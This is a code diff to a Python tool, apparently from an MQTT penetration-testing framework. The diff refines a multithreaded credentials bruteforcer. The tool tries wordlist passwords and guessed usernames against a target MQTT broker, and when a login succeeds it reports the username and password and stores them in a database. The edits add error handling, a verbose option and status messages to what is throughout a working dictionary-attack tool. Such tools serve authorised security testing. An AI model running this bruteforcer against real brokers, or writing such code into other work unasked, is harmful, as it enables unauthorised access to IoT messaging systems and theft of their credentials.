@@ -1,10 +1,11 @@
 import argparse
 import sys
 import threading
+import socket
+import paho.mqtt.client as mqtt
 from datetime import datetime
 from pathlib import Path
 from random import randint
-import paho.mqtt.client as mqtt
 from time import sleep
 from tinydb import TinyDB
 from cmd2 import with_argparser, with_category
@@ -34,14 +35,18 @@ class CredentialsBruteforceMixin(InterfaceMixin):
     bruteforcer_parser.add_argument('-u', '--username', help='username, if not supplied the script will try to guess it'
                                                              ' with a dictionary')
     bruteforcer_parser.add_argument('-t', '--target', help='specified number of thread to use')
+    bruteforcer_parser.add_argument('--verbose', help='increase output verbosity',
+                                    action="store_true")
 
     @with_category(InterfaceMixin.CMD_CAT_BROKER_OP)
     @with_argparser(bruteforcer_parser)
     def do_bruteforce(self, args):
-        self.print_info("Credentials Bruteforcer started - Good Luck!\n")
 
         global comb_found
         comb_found = False
+        self.args = args
+
+        self.print_info("Credentials Bruteforcer started - Good Luck!\n")
 
         if args.target is None:
             # Getting last row from database
@@ -90,7 +95,7 @@ class CredentialsBruteforceMixin(InterfaceMixin):
                                           len_psw_dict, 1)
 
             if args.username is None:
-                self.print_info('DETAILS'
+                self.print_info('DETAILS' +
                                 '\nTARGET => ' + args.target +
                                 '\nPORT => ' + str(args.port) +
                                 '\nTHREADS => ' + str(args.nThreads) +
@@ -113,20 +118,30 @@ class CredentialsBruteforceMixin(InterfaceMixin):
                     for username in usrnm_file:
                         if comb_found:
                             break
-                        self.execute_on_passwords(username, args.dict_password, args.target, args.port, args.nThreads,
-                                                  len_psw_dict, usrnmList_total)
+
+                        try:
+                            self.execute_on_passwords(username, args.dict_password, args.target, args.port,
+                                                      args.nThreads,
+                                                      len_psw_dict, usrnmList_total)
+
+                        except:
+                            break
                         usrnmList_total += 1
                         sys.stdout.write(' >> %d/%d USERNAMES\r' % (usrnmList_total, len_usr_dict))
                         sys.stdout.flush()
 
-        self.print_question(
-            f"Type \\s to add the credentials to the database for the selected target, anythinge else to quit")
-        ans = input(f"Input: ")
-        if ans == '\\s':
-            self.db.update({'credentials': {'username': username_found, 'password': password_found}},
-                           doc_ids=[(len(self.db))])
-            self.print_ok(f"Target credentials updated")
-        self.print_info('Quitted from Bruteforcer')
+        if comb_found:
+            self.print_question(
+                f"Type \\s to add the credentials to the database for the selected target, anythinge else to quit")
+            ans = input(f"Input: ")
+            if ans == '\\s':
+                self.db.update({'credentials': {'username': username_found, 'password': password_found}},
+                               doc_ids=[(len(self.db))])
+                self.print_ok(f"Target credentials updated")
+        else:
+            self.print_error("Bad luck! No username - password combination has been found.")
+
+        self.print_info('Quitted from Bruteforcer\n')
 
     def execute_on_passwords(self, username, wordlist, target, port, nThreads, lenWordlist, usrs_scanned):
         thread_counter = 0
@@ -136,41 +151,49 @@ class CredentialsBruteforceMixin(InterfaceMixin):
         wList = []
 
         bEOF = False
+
         with open(Path(wordlist)) as infile:
             for line in infile:
-                if comb_found:
+
+                try:
+                    if comb_found:
+                        break
+                    wList.append(line.strip('\n'))
+                    if wList_counter == 10:
+                        wList_total += wList_counter
+                        t = PswCracker(target, port, username, wList)
+                        # t.setDaemon(True)
+                        t.start()
+                        del wList
+                        wList = []
+                        thread_counter += 1
+                        wList_counter = 0
+
+                    if thread_counter == nThreads and bEOF is False:
+                        t.join()
+                        thread_counter = 0
+
+                    if i == lenWordlist:
+                        bEOF = True
+                        wList_total += wList_counter
+                        t = PswCracker(target, port, username, wList)
+                        t.setDaemon(True)
+                        t.start()
+                        t.join()
+
+                    sys.stdout.write(' >>> %d/%d attempt\r' % (wList_total, lenWordlist))
+                    sys.stdout.flush()
+                    i += 1
+                    wList_counter += 1
+
+                except Exception as e:
+                    self.print_error("An error occurred: " + str(e))
                     break
-                wList.append(line.strip('\n'))
-                if wList_counter == 10:
-                    wList_total += wList_counter
-                    t = PswCracker(target, port, username, wList)
-                    # t.setDaemon(True)
-                    t.start()
-                    del wList
-                    wList = []
-                    thread_counter += 1
-                    wList_counter = 0
-
-                if thread_counter == nThreads and bEOF is False:
-                    t.join()
-                    thread_counter = 0
-
-                if i == lenWordlist:
-                    bEOF = True
-                    wList_total += wList_counter
-                    t = PswCracker(target, port, username, wList)
-                    t.setDaemon(True)
-                    t.start()
-                    t.join()
-
-                sys.stdout.write(' >>> %d/%d attempt\r' % (wList_total, lenWordlist))
-                sys.stdout.flush()
-                i += 1
-                wList_counter += 1
 
         t.join()
+
         if not comb_found:
-            self.print_error("Bad luck! No username - password combination has been found.")
+            self.print_verbose("No combination with username [ %s ] has been found." % username.rstrip(), self.args)
         else:
             self.print_ok('After %d attempts a successful combination has been found!' % (wList_total + usrs_scanned))
             self.print_ok(' > USERNAME: %s - PASSWORD: %s\r' % (username_found, password_found))
@@ -185,6 +208,12 @@ class PswCracker(threading.Thread):
         self.psw_list = psw_list
         self.cracker = mqtt.Client('C%d' % (randint(1, 1000)))
         self.p_id = False
+        self._socket_exc = None
+
+    def join(self):
+        super().join()
+        if self._socket_exc:
+            raise self._socket_exc
 
     def on_connect(self, c, u, f, rc):
         # rc = 0 means login successful
@@ -193,22 +222,28 @@ class PswCracker(threading.Thread):
 
     def run(self):
         global comb_found, username_found, password_found
-        for passwd in self.psw_list:
-            if comb_found:
-                return
-            self.cracker.username_pw_set(username=self.target_username, password=passwd)
-            self.cracker.on_connect = self.on_connect
-            self.cracker.connect(self.target)
-            self.cracker.loop_start()
-            sleep(1)
-            try:
-                self.cracker.disconnect()
-                self.cracker.loop_stop()
-            except:
-                pass
-            if self.p_id:
-                username_found = self.target_username
-                password_found = passwd
-                comb_found = True
-                break
-        del self.cracker
+
+        try:
+            for passwd in self.psw_list:
+                if comb_found:
+                    return
+                self.cracker.username_pw_set(username=self.target_username, password=passwd)
+                self.cracker.on_connect = self.on_connect
+                self.cracker.connect(self.target)
+                self.cracker.loop_start()
+                sleep(1)
+                try:
+                    self.cracker.disconnect()
+                    self.cracker.loop_stop()
+                except:
+                    pass
+                if self.p_id:
+                    username_found = self.target_username
+                    password_found = passwd
+                    comb_found = True
+                    break
+        except socket.error as e:
+            # Connection failed, host down
+            self._socket_exc = e
+        finally:
+            del self.cracker
